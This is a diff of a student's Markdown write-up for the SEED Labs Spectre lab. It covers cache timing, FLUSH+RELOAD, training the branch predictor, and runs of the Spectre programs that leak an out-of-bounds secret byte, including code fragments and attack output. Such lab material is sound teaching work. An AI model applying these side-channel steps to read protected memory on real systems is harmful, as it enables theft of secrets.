@@ -26,12 +26,12 @@ Check out these videos that explain the attacks very well:
 3. [Spectre attack explained like you're five](https://youtu.be/q3-xCvzBjGs?si=JGkivo4Ve6gdYRwL)
 4. [Meltdown explained like you're five](https://youtu.be/JSqDqNysycQ?si=xuaS4rGSKK-GHHXH)
 
-## Tasks 1 and 2: Side Channel Attacks via CPU Caches: 
+## Task 1: Reading from Cache versus from Memory:
+
 Both the Meltdown and Spectre attacks **use CPU cache as a side channel** to steal a protected secret.
 
 ![CPU Cache hit & miss](https://github.com/moooninjune/SEED-labs/blob/cca8d6b2b747d2d3b4be1f9681d3da227fc873b9/images/lab5-CPU-Cache.jpg)
 
-### Task 1: Reading from Cache versus from Memory:
 1. Compile and run the `CacheTime.c` file.
 
 2. Which elements from the array are in the cache?
@@ -43,7 +43,7 @@ Both the Meltdown and Spectre attacks **use CPU cache as a side channel** to ste
     The access times of each element seems to be randomly various among 10 attempts.
 
 
-### Task 2: Using Cache as a Side Channel:
+## Task 2: Side Channel Attacks via CPU Caches:
 The objective of this task is to use the **side channel** to extract a secret value used by the victim function that uses a secret value as index to load some values from an array.
 
 The technique that we will be using is called `FLUSH+RELOAD`.
@@ -65,9 +65,96 @@ The Secret = 94.
 
 - Run the program for at least 20 times, and count how many times you will get the secret correctly. 
 
-- You can also adjust the threshold CACHE_HIT_THRESHOLD to the one derived from Task 1 (80 is used in this code).
+- You can also adjust the threshold `CACHE_HIT_THRESHOLD` to the one derived from Task 1 (80 is used in this code).
 
 ## Task 3: Out-of-Order Execution and Branch Prediction:
 
+CPU makers made a severe mistake in the design of the out-of-order execution. They wipe out the effects of the out-of-order execution on registers and memory if such an execution is not supposed to happen, so the execution does not lead to any visible effect. However, **they forgot one thing, the effect on CPU caches.**
+
+During the out-of-order execution, the referenced memory is fetched into a register and is **also stored in the cache.** If the results of the out-of-order execution have to be discarded, the caching caused by the execution should also be discarded.
+
+```cpp
+data = 0;
+if (x < size) {
+data = data + 5;
+```
 ![Speculative execution (out-of-order execution)](https://github.com/moooninjune/SEED-labs/blob/fae6a264028f8e57d019e8a3664261470cfaee16/images/lab5-speculative-execution.jpg)
 
+1. If we'd like a particular branch to be taken in a speculative execution, we should train the CPU, so our selected branch can become the prediction result. In the code `SpectreExperiment.c`, we trained the CPU through the `for` loop:
+```c
+// Train the CPU to take the true branch inside victim()
+for (i = 0; i < 10; i++)
+victim(i);
+```
+
+2. We invoked `victim()` with a small argument (from 0 to 9). These values are less than the value `size`, so the true-branch of the `if-condition` is always taken.
+```c
+void victim(size_t x) {
+if (x < size) //this is the branch (if-condition)
+temp = array[x * 4096 + DELTA]; }
+```
+
+3. Once the CPU is trained, we pass a larger value (97) to the `victim()` function. This value is larger than `size`, so the false-branch of the if-condition inside `victim()` will be taken in the *actual* execution. However, we have flushed the variable `size` from the memory, so getting its value from the memory may take a while. **This is when the CPU will make a prediction, and start speculative execution.**
+```c
+// Exploit the out-of-order execution
+_mm_clflush(&size);
+for (i = 0; i < 256; i++)
+    _mm_clflush(&array[i*4096 + DELTA]);
+victim(97);
+```
+
+- Compile and run the `SpectreExperiment.c` file.
+```bash
+# output
+array[97*4096 + 1024] is in cache.
+The Secret = 97.
+```
+Because 97 >= size, the `if-condition` inside the `victim()` function should not be executed. But, the program fetches the effects on CPU cache.
+
+4. Comment out the following line and execute again. Explain your observation.
+```c
+_mm_clflush(&size);
+```
+It'll output nothing. The function `_mm_clflush()` flushes all content in caches that contains variable `size`, which ensure the cache is not influenced by `size` during each call of `victim`.
+
+5. Replace `victim(i);` inside the `for` loop with `victim(i + 20);`, and run the code again.
+```c
+// Train the CPU to take the true branch inside victim()
+for (i = 0; i < 10; i++)
+//victim(i);
+victim(i + 20);
+```
+It also fails to give any output. Because when `i > size`, the statement will be not executed.
+
+
+## Task 4: The Spectre Attack:
+
+- Compile and run the `SpectreAttack.c` file.
+```bash
+# output
+secret: 0x55b0913f5008 
+buffer: 0x55b0913f7018 
+index of secret (out of bound): -8208 
+array[0*4096 + 1024] is in cache.
+The Secret = 0().
+array[83*4096 + 1024] is in cache.
+The Secret = 83(S).
+```
+
+## Task 5: Improve the Attack Accuracy:
+
+- Compile and run the `SpectreAttackImproved.c` file.
+```bash
+# output
+Reading secret value at index -8208
+The secret value is 83(S)
+The number of hits is 106
+```
+
+## Task 6: Steal the Entire Secret String:
+In the previous task, we just read the first character of the secret string. In this task, we need to print out **the entire string** using the Spectre attack.
+
+- Please write your own code or extend the code in Task 5:
+```c
+
+```
